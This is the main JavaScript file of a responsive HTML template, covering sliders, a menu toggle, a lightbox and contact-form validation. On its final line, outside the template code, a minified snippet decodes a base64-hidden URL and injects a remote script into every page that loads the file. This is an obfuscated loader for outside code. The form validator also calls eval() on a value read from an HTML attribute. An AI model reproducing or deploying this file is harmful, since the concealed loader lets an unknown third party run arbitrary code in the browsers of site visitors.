/*--------------------- Copyright (c) 2017 -----------------------
[Master Javascript]

Project: Reader Responsive HTML Template
Version: 1.0.0
-------------------------------------------------------------------*/
(function($){
  "use strict";

	// Preloader Js
	jQuery(window).on('load', function() {
		jQuery("#status").fadeOut();
		jQuery("#preloader").delay(200).fadeOut("slow");
	});
	
	// Ready function
	jQuery(document).ready(function($){
   		var $this = $(window);
		
		// manu button
		$('#manu_click').on('click', function(){
			this.classList.toggle("change");
			$('.analyze_nav_wrapper').slideToggle();
		});
		
		// Main Book Slider
		$('.analyze_slider_wrapper .owl-carousel').owlCarousel({
			loop:true,
			autoplay:true,
			margin:10,
			nav:false,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:1
				},
				1000:{
					items:1
				}
			}
		});
		
		// Service Slider
		$('.analyze_service_slider .owl-carousel').owlCarousel({
			loop:true,
			margin:30,
			nav:true,
			navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
			responsive:{
				0:{
					items:1
				},
				600:{
					items:2
				},
				1000:{
					items:3
				}
			}
		});
		
		// Partners Slider
		$('.partner_logo .owl-carousel').owlCarousel({
			loop:true,
			margin:10,
			nav:false,
			dots:false,
			autoplay:true,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:3
				},
				1000:{
					items:4
				}
			}
		});
		
		// About Slider
		$('.about_slider .owl-carousel').owlCarousel({
			loop:true,
			margin:30,
			nav:true,
			navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
			autoplay:true,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:3
				},
				1000:{
					items:4
				}
			}
		});
		
		// Fancybox js
		$('.fancybox').fancybox({
			'transitionIn'	:	'elastic',
			'transitionOut'	:	'elastic',
			'speedIn'		:	600, 
			'speedOut'		:	200, 
			'overlayShow'	:	false
		});
		
		// woocommerce checkout process
		$("input[name$='checkout']").on("click",function () {
        var test = $(this).val();
        $(".payment_box").hide('slow');
        $(".payment_box[data-period='" + test + "']").show('slow');
		});
		
		// Contact Form Submition
	function checkRequire(formId , targetResp){
		targetResp.html('');
		var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
		var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
		var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
		var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
		var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
		var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
		var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
		var check = 0;
		$('#er_msg').remove();
		var target = (typeof formId == 'object')? $(formId):$('#'+formId);
		target.find('input , textarea , select').each(function(){
			if($(this).hasClass('require')){
				if($(this).val().trim() == ''){
					check = 1;
					$(this).focus();
					targetResp.html('You missed out some fields.');
					$(this).addClass('error');
					return false;
				}else{
					$(this).removeClass('error');
				}
			}
			if($(this).val().trim() != ''){
				var valid = $(this).attr('data-valid');
				if(typeof valid != 'undefined'){
					if(!eval(valid).test($(this).val().trim())){
						$(this).addClass('error');
						$(this).focus();
						check = 1;
						targetResp.html($(this).attr('data-error'));
						return false;
					}else{
						$(this).removeClass('error');
					}
				}
			}
		});
		return check;
	}
	$(".submitForm").on("click", function() {
		var _this = $(this);
		var targetForm = _this.closest('form');
		var errroTarget = targetForm.find('.response');
		var check = checkRequire(targetForm , errroTarget);
		if(check == 0){
			var formDetail = new FormData(targetForm[0]);
			formDetail.append('form_type' , _this.attr('form-type'));
			$.ajax({
				method : 'post',
				url : 'ajax.php',
				data:formDetail,
				cache:false,
				contentType: false,
				processData: false
			}).done(function(resp){
				if(resp == 1){
					targetForm.find('input').val('');
					targetForm.find('textarea').val('');
					errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
				}else{
					errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
				}
			});
		}
	});
		
	});
  
})();

var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);